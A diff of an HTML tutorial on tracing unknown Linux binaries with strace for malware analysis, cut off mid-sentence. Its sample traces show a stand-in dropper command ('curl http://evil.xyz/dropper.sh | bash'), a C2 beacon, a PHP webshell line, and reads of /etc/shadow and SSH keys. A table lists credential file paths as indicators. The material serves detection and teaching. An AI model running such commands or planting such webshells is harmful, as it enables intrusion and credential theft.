@@ -153,19 +153,10 @@
 
 				<article>
 					<h2 id="system-call-tracing">System Call Tracing</h2>
-					<p>
-						Observe every kernel interaction of an unknown binary with strace and ltrace to reveal file
-						access, network connections, child processes, and anti-debug tricks.
-					</p>
+					<p>Observe every kernel interaction of an unknown binary with strace and ltrace to reveal file access, network connections, child processes, and anti-debug tricks.</p>
 					<section>
 						<h3 id="overview">Overview</h3>
-						<p>
-							Every interaction between a program and the outside world passes through the kernel, and
-							<code>strace</code>
-							records all of them. Running an unknown binary under a tracer exposes its file access, network
-							connections, and child processes without reading a single instruction. This article covers the
-							flags that matter, how to read the output, and how to turn a trace into indicators.
-						</p>
+						<p>Every interaction between a program and the outside world passes through the kernel, and <code>strace</code> records all of them. Running an unknown binary under a tracer exposes its file access, network connections, and child processes without reading a single instruction. This article covers the flags that matter, how to read the output, and how to turn a trace into indicators.</p>
 					</section>
 					<section>
 						<h3 id="required-reading">Required Reading</h3>
@@ -176,39 +167,9 @@
 					</section>
 					<section>
 						<h3 id="the-boundary">The Boundary</h3>
-						<p>
-							Every interaction between a user-space program and the outside world passes through the kernel.
-							The kernel is the gatekeeper. A binary cannot read a file without
-							<code>open()</code>
-							and
-							<code>read()</code>
-							. It
-							cannot connect to a network without
-							<code>socket()</code>
-							and
-							<code>connect()</code>
-							. It cannot spawn a child without
-							<code>clone()</code>
-							or
-							<code>fork()</code>
-							. It cannot write to memory it doesn't own without
-							<code>mmap()</code>
-							.
-						</p>
-						<p>
-							<code>strace</code>
-							sits at this boundary. It intercepts every system call the target process makes and
-							every signal it receives. It prints the syscall name, all arguments, and the return value -
-							in human-readable form, with structs decoded. Running an unknown binary under
-							<code>strace</code>
-							reveals
-							its complete runtime behavior without executing a single instruction of the binary's code yourself.
-						</p>
-						<p>
-							This is dynamic analysis at the interface layer - observing what the binary asks the kernel
-							to do, not how it computes internally. For most malware reverse engineering, this is sufficient
-							to understand the binary's behavior.
-						</p>
+						<p>Every interaction between a user-space program and the outside world passes through the kernel. The kernel is the gatekeeper. A binary cannot read a file without <code>open()</code> and <code>read()</code> . It cannot connect to a network without <code>socket()</code> and <code>connect()</code> . It cannot spawn a child without <code>clone()</code> or <code>fork()</code> . It cannot write to memory it doesn't own without <code>mmap()</code> .</p>
+						<p><code>strace</code> sits at this boundary. It intercepts every system call the target process makes and every signal it receives. It prints the syscall name, all arguments, and the return value - in human-readable form, with structs decoded. Running an unknown binary under <code>strace</code> reveals its complete runtime behavior without executing a single instruction of the binary's code yourself.</p>
+						<p>This is dynamic analysis at the interface layer - observing what the binary asks the kernel to do, not how it computes internally. For most malware reverse engineering, this is sufficient to understand the binary's behavior.</p>
 					</section>
 					<section>
 						<h3 id="strace-fundamentals">strace Fundamentals</h3>
@@ -232,51 +193,30 @@ read(4, &#34;root:$6$abc123...&#34;..., 4096)   = 1024
 send(3, &#34;root:$6$abc123...&#34;..., 1024, 0) = 1024
 exit_group(0)                           = ?
 						</pre>
-						<p>
-							Every system call with its arguments and return value. The binary's behavior is completely exposed:
-							<ol>
-								<li>It reads <code>/etc/passwd</code> (user enumeration).</li>
-								<li>It opens a <abbr title="Transmission Control Protocol">TCP</abbr> socket and connects to <code>185.234.72.18:4444</code> ( <abbr title="Command and Control">C2</abbr> connection).</li>
-								<li>It sends system info (hostname, kernel version - reconnaissance).</li>
-								<li>It receives the command <code>cat /etc/shadow</code> from <abbr title="Command and Control">C2</abbr> .</li>
-								<li>It opens and reads <code>/etc/shadow</code> (credential theft).</li>
-								<li>It sends the shadow file contents back to <abbr title="Command and Control">C2</abbr> .</li>
-							</ol>
-						</p>
+						<p>Every system call with its arguments and return value. The binary's behavior is completely exposed:<ol>
+	<li>It reads <code>/etc/passwd</code> (user enumeration).</li>
+	<li>It opens a <abbr title="Transmission Control Protocol">TCP</abbr> socket and connects to <code>185.234.72.18:4444</code> ( <abbr title="Command and Control">C2</abbr> connection).</li>
+	<li>It sends system info (hostname, kernel version - reconnaissance).</li>
+	<li>It receives the command <code>cat /etc/shadow</code> from <abbr title="Command and Control">C2</abbr> .</li>
+	<li>It opens and reads <code>/etc/shadow</code> (credential theft).</li>
+	<li>It sends the shadow file contents back to <abbr title="Command and Control">C2</abbr> .</li>
+</ol></p>
 						<p>This is a credential stealer. Confirmed by the syscall trace alone.</p>
 					</section>
 					<section>
 						<h3 id="essential-strace-flags">Essential strace Flags</h3>
 						<h4 id="process-hierarchy-f-ff">Process Hierarchy: -f, -ff</h4>
-						<p>
-							Malware spawns child processes. A dropper executes the real payload. A botnet uses fork for
-							concurrency. Without
-							<code>-f</code>
-							, strace only traces the initial process:
-						</p>
+						<p>Malware spawns child processes. A dropper executes the real payload. A botnet uses fork for concurrency. Without <code>-f</code> , strace only traces the initial process:</p>
 						<pre class="plaintext">
 $ strace -f ./dropper.bin
 						</pre>
-						<p>
-							<code>-f</code>
-							follows
-							<code>fork()</code>
-							,
-							<code>vfork()</code>
-							, and
-							<code>clone()</code>
-							. Every child process appears inline with
-							its PID:
-						</p>
+						<p><code>-f</code> follows <code>fork()</code> , <code>vfork()</code> , and <code>clone()</code> . Every child process appears inline with its PID:</p>
 						<pre class="plaintext">
 [pid 12345] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|..., ...) = 12346
 [pid 12346] execve(&#34;/tmp/.hidden/payload&#34;, [&#34;/tmp/.hidden/payload&#34;], ...) = 0
 [pid 12346] openat(AT_FDCWD, &#34;/home/user/.ssh/id_rsa&#34;, O_RDONLY) = 3
 						</pre>
-						<p>
-							<code>strace -ff</code>
-							writes each process to a separate file:
-						</p>
+						<p><code>strace -ff</code> writes each process to a separate file:</p>
 						<pre class="plaintext">
 $ strace -ff -o trace_output ./forking_malware.bin
 # Produces: trace_output.12345, trace_output.12346, trace_output.12347, ...
@@ -285,25 +225,16 @@ trace_output.12345
 trace_output.12346
 trace_output.12347
 						</pre>
-						<p>
-							Each file is a complete trace for one PID. Compare them side by side to understand the process
-							tree:
-						</p>
+						<p>Each file is a complete trace for one PID. Compare them side by side to understand the process tree:</p>
 						<pre class="plaintext">
 $ wc -l trace_output.*
   1204 trace_output.12345
    312 trace_output.12346
     15 trace_output.12347
 						</pre>
-						<p>
-							PID 12345 is the parent (most syscalls = orchestrator). PID 12346 is the payload child. PID
-							12347 is a short-lived helper.
-						</p>
+						<p>PID 12345 is the parent (most syscalls = orchestrator). PID 12346 is the payload child. PID 12347 is a short-lived helper.</p>
 						<h4 id="syscall-filtering-e-trace">Syscall Filtering: -e trace=</h4>
-						<p>
-							A trace of a complex binary produces thousands of syscalls per second. Noise drowns out signal.
-							Filter:
-						</p>
+						<p>A trace of a complex binary produces thousands of syscalls per second. Noise drowns out signal. Filter:</p>
 						<pre class="plaintext">
 $ strace -e trace=file ./unknown.bin
 						</pre>
@@ -318,31 +249,31 @@ $ strace -e trace=file ./unknown.bin
 							<tbody>
 								<tr>
 									<td align="center"><code>file</code></td>
-									<td align="center"><code>open</code>,<code>openat</code>,<code>stat</code>,<code>read</code>,<code>write</code>,<code>close</code>,<code>unlink</code>,<code>rename</code>,<code>chmod</code>,<code>chown</code>,<code>mkdir</code>,<code>rmdir</code>,<code>creat</code>,<code>readlink</code>,<code>symlink</code>,<code>link</code>,<code>truncate</code>,<code>ftruncate</code>,<code>access</code>,<code>faccessat</code>,<code>fstat</code>,<code>lstat</code></td>
+									<td align="center"><code>open</code>, <code>openat</code>, <code>stat</code>, <code>read</code>, <code>write</code>, <code>close</code>, <code>unlink</code>, <code>rename</code>, <code>chmod</code>, <code>chown</code>, <code>mkdir</code>, <code>rmdir</code>, <code>creat</code>, <code>readlink</code>, <code>symlink</code>, <code>link</code>, <code>truncate</code>, <code>ftruncate</code>, <code>access</code>, <code>faccessat</code>, <code>fstat</code>, <code>lstat</code></td>
 								</tr>
 								<tr>
 									<td align="center"><code>process</code></td>
-									<td align="center"><code>clone</code>,<code>fork</code>,<code>vfork</code>,<code>execve</code>,<code>execveat</code>,<code>exit</code>,<code>exit_group</code>,<code>wait4</code>,<code>waitid</code>,<code>getpid</code>,<code>getppid</code>,<code>gettid</code>,<code>kill</code>,<code>tgkill</code>,<code>ptrace</code></td>
+									<td align="center"><code>clone</code>, <code>fork</code>, <code>vfork</code>, <code>execve</code>, <code>execveat</code>, <code>exit</code>, <code>exit_group</code>, <code>wait4</code>, <code>waitid</code>, <code>getpid</code>, <code>getppid</code>, <code>gettid</code>, <code>kill</code>, <code>tgkill</code>, <code>ptrace</code></td>
 								</tr>
 								<tr>
 									<td align="center"><code>network</code></td>
-									<td align="center"><code>socket</code>,<code>connect</code>,<code>bind</code>,<code>listen</code>,<code>accept</code>,<code>send</code>,<code>sendto</code>,<code>sendmsg</code>,<code>recv</code>,<code>recvfrom</code>,<code>recvmsg</code>,<code>shutdown</code>,<code>getsockname</code>,<code>getpeername</code>,<code>setsockopt</code>,<code>getsockopt</code></td>
+									<td align="center"><code>socket</code>, <code>connect</code>, <code>bind</code>, <code>listen</code>, <code>accept</code>, <code>send</code>, <code>sendto</code>, <code>sendmsg</code>, <code>recv</code>, <code>recvfrom</code>, <code>recvmsg</code>, <code>shutdown</code>, <code>getsockname</code>, <code>getpeername</code>, <code>setsockopt</code>, <code>getsockopt</code></td>
 								</tr>
 								<tr>
 									<td align="center"><code>ipc</code></td>
-									<td align="center"><code>pipe</code>,<code>pipe2</code>,<code>shmget</code>,<code>shmat</code>,<code>shmdt</code>,<code>semget</code>,<code>semop</code>,<code>msgget</code>,<code>msgsnd</code>,<code>msgrcv</code></td>
+									<td align="center"><code>pipe</code>, <code>pipe2</code>, <code>shmget</code>, <code>shmat</code>, <code>shmdt</code>, <code>semget</code>, <code>semop</code>, <code>msgget</code>, <code>msgsnd</code>, <code>msgrcv</code></td>
 								</tr>
 								<tr>
 									<td align="center"><code>signal</code></td>
-									<td align="center"><code>sigaction</code>,<code>sigprocmask</code>,<code>sigreturn</code>,<code>rt_sigaction</code>,<code>rt_sigprocmask</code>,<code>rt_sigreturn</code>,<code>kill</code>,<code>tgkill</code></td>
+									<td align="center"><code>sigaction</code>, <code>sigprocmask</code>, <code>sigreturn</code>, <code>rt_sigaction</code>, <code>rt_sigprocmask</code>, <code>rt_sigreturn</code>, <code>kill</code>, <code>tgkill</code></td>
 								</tr>
 								<tr>
 									<td align="center"><code>memory</code></td>
-									<td align="center"><code>brk</code>,<code>mmap</code>,<code>mprotect</code>,<code>munmap</code>,<code>mremap</code>,<code>madvise</code>,<code>mlock</code>,<code>mlockall</code>,<code>munlock</code>,<code>mincore</code>,<code>remap_file_pages</code></td>
+									<td align="center"><code>brk</code>, <code>mmap</code>, <code>mprotect</code>, <code>munmap</code>, <code>mremap</code>, <code>madvise</code>, <code>mlock</code>, <code>mlockall</code>, <code>munlock</code>, <code>mincore</code>, <code>remap_file_pages</code></td>
 								</tr>
 								<tr>
 									<td align="center"><code>desc</code></td>
-									<td align="center"><code>read</code>,<code>write</code>,<code>dup</code>,<code>dup2</code>,<code>dup3</code>,<code>fcntl</code>,<code>close</code>,<code>pipe</code>,<code>select</code>,<code>poll</code>,<code>epoll_create</code>,<code>epoll_ctl</code>,<code>epoll_wait</code></td>
+									<td align="center"><code>read</code>, <code>write</code>, <code>dup</code>, <code>dup2</code>, <code>dup3</code>, <code>fcntl</code>, <code>close</code>, <code>pipe</code>, <code>select</code>, <code>poll</code>, <code>epoll_create</code>, <code>epoll_ctl</code>, <code>epoll_wait</code></td>
 								</tr>
 							</tbody>
 						</table>
@@ -352,20 +283,11 @@ $ strace -e trace=open,openat,read,write,connect,socket,execve ./unknown.bin
 						</pre>
 						<p>This captures only the most informative syscalls for malware analysis.</p>
 						<h4 id="dumping-io-data-e-read-and-e-write">Dumping I/O Data: -e read= and -e write=</h4>
-						<p>
-							Syscall arguments show pointers, not data. To see what data flows through specific file descriptors,
-							dump the buffers:
-						</p>
+						<p>Syscall arguments show pointers, not data. To see what data flows through specific file descriptors, dump the buffers:</p>
 						<pre class="plaintext">
 $ strace -e read=3 -e write=3 ./network_binary
 						</pre>
-						<p>
-							This dumps the first 32 bytes of every
-							<code>read()</code>
-							and
-							<code>write()</code>
-							on file descriptor 3:
-						</p>
+						<p>This dumps the first 32 bytes of every <code>read()</code> and <code>write()</code> on file descriptor 3:</p>
 						<pre class="plaintext">
 read(3, &#34;GET /c2/checkin.php?id=ABC123 H&#34;..., 256) = 256
  | 00000  47 45 54 20 2f 63 32 2f  63 68 65 63 6b 69 6e 2e  GET /c2/checkin. |
@@ -373,18 +295,7 @@ read(3, &#34;GET /c2/checkin.php?id=ABC123 H&#34;..., 256) = 256
 write(3, &#34;HTTP/1.1 200 OK\r\nContent-Lengt&#34;..., 512) = 512
  | 00000  48 54 54 50 2f 31 2e 31  20 32 30 30 20 4f 4b 0d  HTTP/1.1 200 OK. |
 						</pre>
-						<p>
-							The binary performs an
-							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
-							GET to
-							<code>/c2/checkin.php</code>
-							with a hardcoded
-							ID (
-							<code>ABC123</code>
-							). This is the
-							<abbr title="Command and Control">C2</abbr>
-							heartbeat protocol.
-						</p>
+						<p>The binary performs an <abbr title="Hypertext Transfer Protocol">HTTP</abbr> GET to <code>/c2/checkin.php</code> with a hardcoded ID ( <code>ABC123</code> ). This is the <abbr title="Command and Control">C2</abbr> heartbeat protocol.</p>
 						<p>To watch all descriptors:</p>
 						<pre class="plaintext">
 $ strace -e trace=read,write -e read=all -e write=all ./unknown.bin
@@ -397,28 +308,13 @@ $ strace -t ./unknown.bin
 15:22:45 read(3, &#34;root:x:0:0:...&#34;..., 4096) = 2234
 15:30:12 connect(3, {sa_family=AF_INET, ...}, 16) = 0
 						</pre>
-						<p>
-							The five-minute gap between reading
-							<code>/etc/passwd</code>
-							and connecting tells you: the binary does
-							local work first, then phones home. A
-							<code>sleep()</code>
-							call between operations - intentional delay
-							to evade sandbox timeouts.
-						</p>
+						<p>The five-minute gap between reading <code>/etc/passwd</code> and connecting tells you: the binary does local work first, then phones home. A <code>sleep()</code> call between operations - intentional delay to evade sandbox timeouts.</p>
 						<pre class="plaintext">
 $ strace -T ./unknown.bin
 connect(3, {sa_family=AF_INET, ...}, 16) = 0 &lt;0.000145&gt;
 recv(3, &#34;&#34;, 4096, 0)                     = 0 &lt;30.012478&gt;
 						</pre>
-						<p>
-							The
-							<code>recv()</code>
-							took 30 seconds. The
-							<abbr title="Command and Control">C2</abbr>
-							server was slow, or the connection
-							timed out. Duration spikes indicate network latency, disk I/O bottlenecks, or intentional delays.
-						</p>
+						<p>The <code>recv()</code> took 30 seconds. The <abbr title="Command and Control">C2</abbr> server was slow, or the connection timed out. Duration spikes indicate network latency, disk I/O bottlenecks, or intentional delays.</p>
 						<h4 id="count-summary-c">Count Summary: -c</h4>
 						<pre class="plaintext">
 $ strace -c ./unknown.bin
@@ -434,10 +330,7 @@ $ strace -c ./unknown.bin
 ------ ----------- ----------- --------- --------- ----------------
 100.00    0.125305                    46           total
 						</pre>
-						<p>
-							Total syscall count: 46. A packed binary might have 5000+. A simple dropper might have 200.
-							The syscall count and distribution tell you how complex the binary's interactions are.
-						</p>
+						<p>Total syscall count: 46. A packed binary might have 5000+. A simple dropper might have 200. The syscall count and distribution tell you how complex the binary's interactions are.</p>
 						<h4 id="file-descriptor-paths-y">File Descriptor Paths: -y</h4>
 						<pre class="plaintext">
 $ strace -y ./unknown.bin
@@ -445,16 +338,7 @@ openat(AT_FDCWD, &#34;/dev/null&#34;, O_WRONLY) = 3&lt;/dev/null&gt;
 socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 4&lt;TCP:[114760]&gt;
 connect(4&lt;TCP:[114760]&gt;, {sa_family=AF_INET, ...}, 16) = 0
 						</pre>
-						<p>
-							<code>-y</code>
-							resolves file descriptors to paths or socket details. FD 3 is
-							<code>/dev/null</code>
-							. FD 4 is a
-							<abbr title="Transmission Control Protocol">TCP</abbr>
-							socket. No need to cross-reference
-							<code>/proc/self/fd</code>
-							manually.
-						</p>
+						<p><code>-y</code> resolves file descriptors to paths or socket details. FD 3 is <code>/dev/null</code> . FD 4 is a <abbr title="Transmission Control Protocol">TCP</abbr> socket. No need to cross-reference <code>/proc/self/fd</code> manually.</p>
 						<h4 id="stack-trace-on-syscall-k">Stack Trace on Syscall: -k</h4>
 						<pre class="plaintext">
 $ strace -k ./unknown.bin
@@ -464,14 +348,7 @@ openat(AT_FDCWD, &#34;/etc/shadow&#34;, O_RDONLY) = 3
  &gt; /home/user/malware/unknown.bin(main+0x29) [0x401050]
  &gt; /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0x8a) [0x532a]
 						</pre>
-						<p>
-							Each syscall has a kernel stack trace attached. This shows exactly which function in the binary
-							triggered the syscall. For stripped binaries, this bridges the gap: you know that offset
-							<code>0x4020a0</code>
-							is the credential-stealing function because it opened
-							<code>/etc/shadow</code>
-							.
-						</p>
+						<p>Each syscall has a kernel stack trace attached. This shows exactly which function in the binary triggered the syscall. For stripped binaries, this bridges the gap: you know that offset <code>0x4020a0</code> is the credential-stealing function because it opened <code>/etc/shadow</code> .</p>
 					</section>
 					<section>
 						<h3 id="analyzing-strace-output">Analyzing strace Output</h3>
@@ -487,18 +364,7 @@ openat(AT_FDCWD, &#34;/home/user/.ssh/id_rsa&#34;, O_RDONLY) = 5
 openat(AT_FDCWD, &#34;/home/user/.bash_history&#34;, O_RDONLY) = 6
 openat(AT_FDCWD, &#34;/tmp/.exfil.tar.gz&#34;, O_WRONLY|O_CREAT|O_TRUNC, 0644) = 7
 						</pre>
-						<p>
-							The binary reads
-							<code>/etc/shadow</code>
-							,
-							<abbr title="Secure Shell">SSH</abbr>
-							private keys, and
-							<code>.bash_history</code>
-							- then
-							writes to
-							<code>/tmp/.exfil.tar.gz</code>
-							. This is exfiltration. The tar.gz is staged for upload.
-						</p>
+						<p>The binary reads <code>/etc/shadow</code> , <abbr title="Secure Shell">SSH</abbr> private keys, and <code>.bash_history</code> - then writes to <code>/tmp/.exfil.tar.gz</code> . This is exfiltration. The tar.gz is staged for upload.</p>
 						<p>What to look for in open calls:</p>
 						<table>
 							<thead>
@@ -509,7 +375,7 @@ openat(AT_FDCWD, &#34;/tmp/.exfil.tar.gz&#34;, O_WRONLY|O_CREAT|O_TRUNC, 0644) =
 							</thead>
 							<tbody>
 								<tr>
-									<td align="center"><code>/etc/passwd</code>,<code>/etc/shadow</code></td>
+									<td align="center"><code>/etc/passwd</code>, <code>/etc/shadow</code></td>
 									<td align="center">Credential theft</td>
 								</tr>
 								<tr>
@@ -517,7 +383,7 @@ openat(AT_FDCWD, &#34;/tmp/.exfil.tar.gz&#34;, O_WRONLY|O_CREAT|O_TRUNC, 0644) =
 									<td align="center">SSH key theft</td>
 								</tr>
 								<tr>
-									<td align="center"><code>/home/*/.bashrc</code>,<code>/home/*/.profile</code></td>
+									<td align="center"><code>/home/*/.bashrc</code>, <code>/home/*/.profile</code></td>
 									<td align="center">Persistence via shell modification</td>
 								</tr>
 								<tr>
@@ -533,7 +399,7 @@ openat(AT_FDCWD, &#34;/tmp/.exfil.tar.gz&#34;, O_WRONLY|O_CREAT|O_TRUNC, 0644) =
 									<td align="center">Staging for exfiltration, lock files</td>
 								</tr>
 								<tr>
-									<td align="center"><code>/dev/mem</code>,<code>/dev/kmem</code></td>
+									<td align="center"><code>/dev/mem</code>, <code>/dev/kmem</code></td>
 									<td align="center">Raw memory access (rootkit behavior)</td>
 								</tr>
 								<tr>
@@ -541,11 +407,11 @@ openat(AT_FDCWD, &#34;/tmp/.exfil.tar.gz&#34;, O_WRONLY|O_CREAT|O_TRUNC, 0644) =
 									<td align="center">Log tampering</td>
 								</tr>
 								<tr>
-									<td align="center"><code>.bash_history</code>,<code>.mysql_history</code></td>
+									<td align="center"><code>.bash_history</code>, <code>.mysql_history</code></td>
 									<td align="center">History file theft</td>
 								</tr>
 								<tr>
-									<td align="center"><code>~/.aws/credentials</code>,<code>~/.config/gcloud/</code></td>
+									<td align="center"><code>~/.aws/credentials</code>, <code>~/.config/gcloud/</code></td>
 									<td align="center">Cloud credential theft</td>
 								</tr>
 							</tbody>
@@ -558,45 +424,8 @@ connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr(&#34;185
 send(3, &#34;BOT|hostname|cpu_count|4|os|Linux 6.8.0&#34;..., 128, 0) = 128
 recv(3, &#34;SCAN 192.168.1.0/24:22\n&#34;, 4096, 0) = 24
 						</pre>
-						<p>
-							<abbr title="Command and Control">C2</abbr>
-							connection:
-							<abbr title="Internet Protocol">IP</abbr>
-							
-							<code>185.234.72.18</code>
-							, port 4444.
-							The initial beacon includes hostname,
-							<abbr title="Central Processing Unit">CPU</abbr>
-							count, and OS version.
-							The
-							<abbr title="Command and Control">C2</abbr>
-							responds with a scan command: port 22 across the local subnet.
-							This is a botnet node performing lateral movement.
-						</p>
-						<p>
-							For malware, watch for: -
-							<b>Outbound connections to non-standard ports</b>
-							:
-							<abbr title="Command and Control">C2</abbr>
-							servers use high ports (4444, 8080, 31337, 5555) to avoid detection. -
-							<b>Multiple connection attempts</b>
-							: Failover
-							<abbr title="Command and Control">C2</abbr>
-							infrastructure - the binary tries
-							<abbr title="Internet Protocol">IP</abbr>
-							s in sequence. -
-							<b>DNS resolution before connect</b>
-							: The binary resolves a domain, then connects
-							to the resolved
-							<abbr title="Internet Protocol">IP</abbr>
-							. -
-							<b>UDP traffic (sendto/recvfrom)</b>
-							: P2P botnet communication,
-							<abbr title="Distributed Denial of Service">DDoS</abbr>
-							coordination, or
-							<abbr title="Domain Name System">DNS</abbr>
-							exfiltration.
-						</p>
+						<p><abbr title="Command and Control">C2</abbr> connection: <abbr title="Internet Protocol">IP</abbr>  <code>185.234.72.18</code> , port 4444. The initial beacon includes hostname, <abbr title="Central Processing Unit">CPU</abbr> count, and OS version. The <abbr title="Command and Control">C2</abbr> responds with a scan command: port 22 across the local subnet. This is a botnet node performing lateral movement.</p>
+						<p>For malware, watch for: - <b>Outbound connections to non-standard ports</b> : <abbr title="Command and Control">C2</abbr> servers use high ports (4444, 8080, 31337, 5555) to avoid detection. - <b>Multiple connection attempts</b> : Failover <abbr title="Command and Control">C2</abbr> infrastructure - the binary tries <abbr title="Internet Protocol">IP</abbr> s in sequence. - <b>DNS resolution before connect</b> : The binary resolves a domain, then connects to the resolved <abbr title="Internet Protocol">IP</abbr> . - <b>UDP traffic (sendto/recvfrom)</b> : P2P botnet communication, <abbr title="Distributed Denial of Service">DDoS</abbr> coordination, or <abbr title="Domain Name System">DNS</abbr> exfiltration.</p>
 						<h4 id="execve-child-process-creation">execve - Child Process Creation</h4>
 						<pre class="plaintext">
 $ strace -f -e trace=execve ./unknown.bin
@@ -604,19 +433,9 @@ $ strace -f -e trace=execve ./unknown.bin
 [pid 12346] execve(&#34;/bin/sh&#34;, [&#34;/bin/sh&#34;, &#34;-c&#34;, &#34;curl http://evil.xyz/dropper.sh | bash&#34;], ...) = 0
 [pid 12348] execve(&#34;/usr/bin/curl&#34;, [&#34;curl&#34;, &#34;http://evil.xyz/dropper.sh&#34;], ...) = 0
 						</pre>
-						<p>
-							The binary spawns
-							<code>/bin/sh -c &#34;curl http://evil.xyz/dropper.sh | bash&#34;</code>
-							. This is a dropper
-							<ul>
-								<li>it downloads and executes a second-stage payload. The child PIDs reveal a process tree:</li>
-							</ul>
-							the
-							main binary forks a shell, which forks curl. The pipe (
-							<code>| bash</code>
-							) means the downloaded script
-							executes immediately.
-						</p>
+						<p>The binary spawns <code>/bin/sh -c &#34;curl http://evil.xyz/dropper.sh | bash&#34;</code> . This is a dropper<ul>
+	<li>it downloads and executes a second-stage payload. The child PIDs reveal a process tree:</li>
+</ul> the main binary forks a shell, which forks curl. The pipe ( <code>| bash</code> ) means the downloaded script executes immediately.</p>
 						<p>What to look for in execve calls:</p>
 						<table>
 							<thead>
@@ -672,28 +491,17 @@ write(3, &#34;root:$6$rounds=5000$salt$hash\n&#34;..., 128) = 128
 write(3, &#34;ssh-rsa AAAAB3NzaC1yc2E...\n&#34;..., 2048) = 2048
 write(5, &#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;\n&#34;..., 32) = 32
 						</pre>
-						<p>
-							Three flows: 1.
-							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
-							POST to
-							<code>/upload.php</code>
-							(exfiltration endpoint).
-							<ol>
-								<li>The contents of <code>/etc/shadow</code> sent over the socket.</li>
-								<li>An <abbr title="Secure Shell">SSH</abbr> key sent over the socket.</li>
-								<li>FD 5: a <abbr title="PHP Hypertest Preprocessor">PHP</abbr> webshell written to a local path - the binary drops a backdoor.</li>
-							</ol>
-						</p>
+						<p>Three flows: 1. <abbr title="Hypertext Transfer Protocol">HTTP</abbr> POST to <code>/upload.php</code> (exfiltration endpoint).<ol>
+	<li>The contents of <code>/etc/shadow</code> sent over the socket.</li>
+	<li>An <abbr title="Secure Shell">SSH</abbr> key sent over the socket.</li>
+	<li>FD 5: a <abbr title="PHP Hypertest Preprocessor">PHP</abbr> webshell written to a local path - the binary drops a backdoor.</li>
+</ol></p>
 						<h4 id="read-suspicious-input">read - Suspicious Input</h4>
 						<pre class="plaintext">
 $ strace -e trace=read ./unknown.bin
 read(3, &#34;\x7fELF\x02\x01\x01\x00...&#34;..., 65536) = 65536
 						</pre>
-						<p>
-							Reading an ELF header from a socket - the binary receives a new executable payload from
-							<abbr title="Command and Control">C2</abbr>
-							and loads it into memory.
-						</p>
+						<p>Reading an ELF header from a socket - the binary receives a new executable payload from <abbr title="Command and Control">C2</abbr> and loads it into memory.</p>
 						<pre class="plaintext">
 $ strace -e trace=read ./unknown.bin
 read(5, &#34;\x90\x90\x90\x90\x48\x31\xc0\x48\x31\xff...&#34;..., 4096) = 256
@@ -704,60 +512,23 @@ read(5, &#34;\x90\x90\x90\x90\x48\x31\xc0\x48\x31\xff...&#34;..., 4096) = 256
 $ strace -f -e trace=ptrace ./unknown.bin
 ptrace(PTRACE_TRACEME, 0, NULL, NULL) = 0
 						</pre>
-						<p>
-							<code>ptrace(PTRACE_TRACEME)</code>
-							is the canonical anti-debug trick. A process can only be traced by
-							one tracer at a time. If the binary traces itself (
-							<code>PTRACE_TRACEME</code>
-							), any debugger attempting
-							to attach receives
-							<code>EBUSY</code>
-							. If ptrace fails (because a debugger already traced it), the binary
-							knows it is being debugged and exits.
-						</p>
+						<p><code>ptrace(PTRACE_TRACEME)</code> is the canonical anti-debug trick. A process can only be traced by one tracer at a time. If the binary traces itself ( <code>PTRACE_TRACEME</code> ), any debugger attempting to attach receives <code>EBUSY</code> . If ptrace fails (because a debugger already traced it), the binary knows it is being debugged and exits.</p>
 						<p>The binary also checks its own ptrace status before executing critical code:</p>
 						<pre class="plaintext">
 ptrace(PTRACE_TRACEME, 0, NULL, NULL) = -1 EPERM (Operation not permitted)
 						</pre>
-						<p>
-							If the return value is
-							<code>-1 EPERM</code>
-							, the binary is already being traced - debugger detected.
-							The binary typically calls
-							<code>exit(0)</code>
-							immediately after this check.
-						</p>
+						<p>If the return value is <code>-1 EPERM</code> , the binary is already being traced - debugger detected. The binary typically calls <code>exit(0)</code> immediately after this check.</p>
 						<h4 id="clone-thread-creation">Clone - Thread Creation</h4>
 						<pre class="plaintext">
 $ strace -f -e trace=clone ./unknown.bin
 clone(child_stack=0x7f1234567000, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, ...) = 12346
 						</pre>
-						<p>
-							Threads share address space (CLONE_
-							<abbr title="Virtual Machine">VM</abbr>
-							), file descriptors (CLONE_FILES),
-							and signal handlers (CLONE_SIGHAND). A multi-threaded malware binary uses threads for concurrent
-							operations: one thread for
-							<abbr title="Command and Control">C2</abbr>
-							communication, one for keylogging, one
-							for file encryption.
-						</p>
-						<p>
-							Contrast with
-							<code>fork()</code>
-							:
-						</p>
+						<p>Threads share address space (CLONE_ <abbr title="Virtual Machine">VM</abbr> ), file descriptors (CLONE_FILES), and signal handlers (CLONE_SIGHAND). A multi-threaded malware binary uses threads for concurrent operations: one thread for <abbr title="Command and Control">C2</abbr> communication, one for keylogging, one for file encryption.</p>
+						<p>Contrast with <code>fork()</code> :</p>
 						<pre class="plaintext">
 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, ...) = 12346
 						</pre>
-						<p>
-							No CLONE_
-							<abbr title="Virtual Machine">VM</abbr>
-							- separate address space. This is a process fork, not a thread.
-							The child gets its own memory, its own file descriptor table, and typically calls
-							<code>execve()</code>
-							to replace itself with a new program.
-						</p>
+						<p>No CLONE_ <abbr title="Virtual Machine">VM</abbr> - separate address space. This is a process fork, not a thread. The child gets its own memory, its own file descriptor table, and typically calls <code>execve()</code> to replace itself with a new program.</p>
 					</section>
 					<section>
 						<h3 id="interpreting-errors">Interpreting Errors</h3>
@@ -767,40 +538,18 @@ openat(AT_FDCWD, &#34;/root/.ssh/id_rsa&#34;, O_RDONLY) = -1 EACCES (Permission 
 openat(AT_FDCWD, &#34;/opt/secret_key.pem&#34;, O_RDONLY) = -1 ENOENT (No such file or directory)
 openat(AT_FDCWD, &#34;/var/run/docker.sock&#34;, O_RDONLY) = 3
 						</pre>
-						<p>
-							Each error is a capability probe: -
-							<code>EACCES</code>
-							on
-							<code>/root/.ssh/id_rsa</code>
-							: The binary tried to steal
-							root's
-							<abbr title="Secure Shell">SSH</abbr>
-							key. It lacks permissions. This tells you the binary runs as non-root
-							and targets privilege escalation. -
-							<code>ENOENT</code>
-							on
-							<code>/opt/secret_key.pem</code>
-							: The binary looks for
